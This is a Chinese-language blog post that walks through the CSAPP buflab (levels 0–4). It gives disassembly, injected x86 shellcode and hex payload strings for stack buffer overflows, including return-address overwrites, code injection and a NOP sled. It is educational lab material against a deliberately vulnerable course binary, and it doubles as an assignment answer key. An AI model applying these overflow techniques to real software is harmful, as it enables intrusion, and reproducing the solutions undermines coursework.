---
title: CSAPP-buflab
layout: post
tags:
  - CSAPP
  - 缓冲区
  - 汇编
categories:
  - 技术
  - 汇编
description: 本文详细介绍了 CSAPP 提供的 buflab，包括 level 0 至 level 4，以及如何解决它们。想要不费力的阅读需要对栈帧有一定的了解...
abbrlink: d1c69fdf
date: 2020-06-05 22:56:10
---

| 选项     | 参数                                                         |
| -------- | ------------------------------------------------------------ |
| 系统环境 | Windows10 系统下 VMware 虚拟机 Ubuntu12.04 桌面版 32 位      |
| 原址链接 | [http://csapp.cs.cmu.edu/3e/labs.html](http://csapp.cs.cmu.edu/3e/labs.html) |
| `userid` | `Wilfred`                                                    |
| `cookie` | `0x23a81b97`                                                 |

## level0 Candle

首先进入 `gdb `调试，观察到调用路径为：

```mermaid
graph LR;
main(main) --> launcher(launcher);
launcher --> launch(launch);
launch --> test(test);
test --> getbuf(getbuf);
getbuf --> Gets(Gets);
```

其中 `Gets` 用于读取字符串，`getbuf` 分配存储空间并调用 `Gets` 读取字符串，所以攻击的目标为 `getbuf` 函数。

查看 `getbuf` 的反汇编代码

```x86asm
08049262 <getbuf>:
 8049262:   55                      push   %ebp
 8049263:   89 e5                   mov    %esp,%ebp
 8049265:   83 ec 38                sub    $0x38,%esp
 8049268:   8d 45 d8                lea    -0x28(%ebp),%eax
 804926b:   89 04 24                mov    %eax,(%esp)
 804926e:   e8 bf f9 ff ff          call   8048c32 <Gets>
 8049273:   b8 01 00 00 00          mov    $0x1,%eax
 8049278:   c9                      leave  
 8049279:   c3                      ret
```

确定 `buffer` 的首地址为 `-0x28(%ebp)`，而返回地址存放在 `0x4(%ebp)`，两者间隔 `44` 个字节，同时返回地址占 `4` 个字节的空间，所以至少需要 `48` 个字节长度的字符。

构造如下字符串（使用二进制码表示，特殊字符无法显示）：

```
0/* spaces 44 Bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00

/* return address to smoke 4 Bytes */
0b 8e 04 08
```

主义如果系统是小端法存储，则多字节数据要倒着写（博主虚拟机是小端法，所以这里返回地址倒着写）。

尝试运行，成功调用：

![][level0]

## level1 Sparkler

该题与 `level0` 类似，不过调用的是 `fizz` 函数，观察反汇编代码：

```x86asm
; fizz(int var1)
08048daf <fizz>:
 8048daf:   55                      push   %ebp
 8048db0:   89 e5                   mov    %esp,%ebp
 8048db2:   83 ec 18                sub    $0x18,%esp
 ; if (var1 == cookie)
 8048db5:   8b 45 08                mov    0x8(%ebp),%eax
 8048db8:   3b 05 04 d1 04 08       cmp    0x804d104,%eax
 8048dbe:   75 26                   jne    8048de6 <fizz+0x37>
 ;   __printf_chk(1, "Fizz!: You called fizz(0x%x)", var1)
 8048dc0:   89 44 24 08             mov    %eax,0x8(%esp)
 8048dc4:   c7 44 24 04 e0 a2 04    movl   $0x804a2e0,0x4(%esp)
 8048dcb:   08 
 8048dcc:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048dd3:   e8 b8 fb ff ff          call   8048990 <__printf_chk@plt>
 8048dd8:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048ddf:   e8 9c 04 00 00          call   8049280 <validate>
 8048de4:   eb 18                   jmp    8048dfe <fizz+0x4f>
 ; else
 ;   __printf_chk(1, "Misfire: You called fizz(0x%x)\n", var1)
 8048de6:   89 44 24 08             mov    %eax,0x8(%esp)
 8048dea:   c7 44 24 04 d4 a4 04    movl   $0x804a4d4,0x4(%esp)
 8048df1:   08 
 8048df2:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048df9:   e8 92 fb ff ff          call   8048990 <__printf_chk@plt>
 ; end if
 ; exit(0)
 8048dfe:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048e05:   e8 c6 fa ff ff          call   80488d0 <exit@plt>
```

发现 `fizz` 函数传入了一个参数，并且要求与 `cookie` 相同。

如果了解栈帧，就知道第一个参数的位置为 `0x8(%ebp)`，构造如下字符串：

```
/* spaces 44 Bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00

/* return address to fizz 4 Bytes */
af 8d 04 08

/* spaces 4 Bytes */
00 00 00 00

/* cookie 4 Bytes */
97 1b a8 23
```

切记，由于进入 `fizz` 是通过 `return`，`ebp` 的值会加 `4`，所以 `fizz` 的 `0x8(%ebp)` 对应 `getbuf` 的`0xc(%ebp)`，需要填充被跳过的 `4` 个字节。

尝试运行，成功通过：

![][level1]

## level2 Firecracker

该题需要调用 `bang` 函数，观察反汇编代码：

```x86asm
08048d52 <bang>:
 8048d52:   55                      push   %ebp
 8048d53:   89 e5                   mov    %esp,%ebp
 8048d55:   83 ec 18                sub    $0x18,%esp
 ; if (global_value == cookie)
 8048d58:   a1 0c d1 04 08          mov    0x804d10c,%eax
 8048d5d:   3b 05 04 d1 04 08       cmp    0x804d104,%eax
 8048d63:   75 26                   jne    8048d8b <bang+0x39>
 ;   true
 ;   __printf_chk(1, "Bang!: You set global_value to 0x%x\n", global_value)
 8048d65:   89 44 24 08             mov    %eax,0x8(%esp)
 8048d69:   c7 44 24 04 ac a4 04    movl   $0x804a4ac,0x4(%esp)
 8048d70:   08 
 8048d71:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048d78:   e8 13 fc ff ff          call   8048990 <__printf_chk@plt>
 ;   validate(2)
 8048d7d:   c7 04 24 02 00 00 00    movl   $0x2,(%esp)
 8048d84:   e8 f7 04 00 00          call   8049280 <validate>
 8048d89:   eb 18                   jmp    8048da3 <bang+0x51>
 ;   false
 ;   __printf_chk(1, "Misfire: global_value = 0x%x\n", global_value)
 8048d8b:   89 44 24 08             mov    %eax,0x8(%esp)
 8048d8f:   c7 44 24 04 c2 a2 04    movl   $0x804a2c2,0x4(%esp)
 8048d96:   08 
 8048d97:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048d9e:   e8 ed fb ff ff          call   8048990 <__printf_chk@plt>
 ; end if
 8048da3:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048daa:   e8 21 fb ff ff          call   80488d0 <exit@plt>
```

发现代码中判断了全局变量的值是否为 `cookie`，而全局变量不存在于栈中，无法通过缓冲区溢出来覆写它的值，只能通过注入代码来实现。所以需要在字符串中构造一个函数，先通过 `getbuf` 函数返回至构造的代码，在构造的代码中返回至 `bang` 函数。

首先设计汇编代码：

```x86asm
mov $0x23a81b97,%eax
mov $0x0804d10c,%ecx
mov %eax,(%ecx)
ret
```

将 `cookie` 存入 `eax` 寄存器，再将全局变量的地址存入 `ecx` 寄存器，通过间接寻址来更改其值然后返回。

使用 `as` 命令编译成 `.o` 文件然后使用 `objdump` 命令获得相应的二进制编码，之后构造字符串：

```
/* my function 13 Bytes */
b8 97 1b a8 23 /* mov $0x23a81b97,%eax */
b9 0c d1 04 08 /* mov $0x0804d10c,%ecx */
89 01          /* mov %eax,(%ecx) */
c3             /* ret */

/* spaces 31 Bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00

/* return address to my function 4 Bytes */
58 2f 68 55

/* return address to bang 4 Bytes */
52 8d 04 08
```

运行程序，成功通过：

![][level2]

## level3 Dynamite

本题不再要求返回至其他的函数，而是要求返回至应当返回的地方（`test`中的下一条指令），但是要求返回至更改为 `cookie`，依旧需要注入代码来实现。同时 `test` 中对栈帧进行了检查，所以在返回至 `test` 时需要还原 `ebp` 寄存器的值。

在 `gdb` 中找到需要还原的值：

![][level3-1]

设计如下汇编代码：

```x86asm
push $0x08048e50        # set return address
push $0x55682fb0        # restore ebp
mov $0x23a81b97,%eax    # return value (cookie)
leave
ret
```

由于 `PUSH` 指令存放的地址取决于 `ebp`，所以在设计字符串时不能将存放 `ebp` 的空间覆写为其他值：

```
/* my function 17 Bytes */
68 50 8e 04 08 /* push $0x8048e50 */
68 b0 2f 68 55 /* push $0x55682fb0 */
b8 97 1b a8 23 /* mov $0x23a81b97,%eax */
c9             /* leave */
c3             /* ret */

/* spaces 23 Bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00

/* set ebp 4 Bytes */
80 2f 68 55

/* return address to my function 4 Bytes */
58 2f 68 55
```

还原 `ebp` 的方法还有另外一种，见 `level4`。

运行程序，成功通过：

![][level3-2]

## level4 Nitroglycerin

本题与 `level3` 类似，区别在于会执行 5 次，而且每次调用的栈帧位置都会发生变化，同时要求只使用一份字符串来实现功能。

本题的调用路径发生了一些变化：

```mermaid
graph LR;
main(main) --> launcher(launcher);
launcher --> launch(launch);
launch --> testn(testn);
testn --> getbufn(getbufn);
getbufn --> Gets(Gets);
```

其中 `buffer` 的空间扩大成了 512 个字节，比原先多了 480 个字节。

由于只能使用一份字符串，所以每次返回至的位置是相同的，但是每次栈帧位置都会发生变化，所以我们要保证返回至的位置应当是无效代码，同时它应当在我们需要执行的代码的前面（更小的地址）。

由于栈帧不固定，所以 `ebp` 并非确定的，需要通过 `esp` 来确定其值，首先观察 `testn` 的反汇编代码：

```x86asm
08048cce <testn>:
 8048cce:   55                      push   %ebp
 8048ccf:   89 e5                   mov    %esp,%ebp
 8048cd1:   53                      push   %ebx
 8048cd2:   83 ec 24                sub    $0x24,%esp
```

在 `MOV` 指令执行完毕时 `esp` 与 `ebp` 的值相等，之后执行了一次 `PUSH`（`esp`值减 `4`），再执行 `SUB` 指令，所以 `ebp = esp+0x28`。

设计如下代码：

```x86asm
lea 0x28(%esp),%ebp     # restore ebp
push $0x08048ce2        # set return address
mov $0x23a81b97,%eax    # return value (cookie)
ret
```

接下来需要确定跳转的地方，即 `getbuf` 的返回地址。虽然 5 次调用的栈帧地址不同，但是多次执行程序，每次都是相同的，所以可以确定跳转的范围：

| 次数 | `ebp` 的值   | `buffer` 的首地址 |
| ---- | ------------ | ----------------- |
| 1    | `0x55682f80` | `0x55682d78`      |
| 2    | `0x55682f50` | `0x55682d48`      |
| 3    | `0x55682f60` | `0x55682d58`      |
| 4    | `0x55682f00` | `0x55682cf8`      |
| 5    | `0x55682f40` | `0x55682d38`      |

跳转的安全范围应当是 `buffer ~ ebp`，而 `buffer` 最大为 `0x55682d78`，所以选择跳转至 `0x55682d78` 一定能落在恶意数据的范围内。

接下来确定填充的数据，它应当满足以下两个条件：

1. 本身不会影响到程序的功能
2. 指令长度应当为 `1` 个字节，以免跳转至一条指令的中间部分导致错误

恰好 `NOP` 指令满足以上条件，其值为 `0x90`。

设计如下字符串：

```
/* nop sleds 505 Bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90

/* my function 15 Bytes */
8d 6c 24 28    /* lea 0x28(%esp),%ebp */
68 e2 8c 04 08 /* push $0x8048ce2 */
b8 97 1b a8 23 /* mov $0x23a81b97,%eax */
c3             /* ret  */

/* set ebp 4 Bytes */
00 00 00 00

/* set return address 4 Bytes */
78 2d 68 55
```

运行程序，成功通过：

![][level4]

至此，buflab 全部完成！

[level0]: http://static.wilfredshen.cn/images/CSAPP-buflab/level0.png
[level1]: http://static.wilfredshen.cn/images/CSAPP-buflab/level1.png
[level2]: http://static.wilfredshen.cn/images/CSAPP-buflab/level2.png
[level3-1]: http://static.wilfredshen.cn/images/CSAPP-buflab/level3-1.png
[level3-2]: http://static.wilfredshen.cn/images/CSAPP-buflab/level3-2.png
[level4]: http://static.wilfredshen.cn/images/CSAPP-buflab/level4.png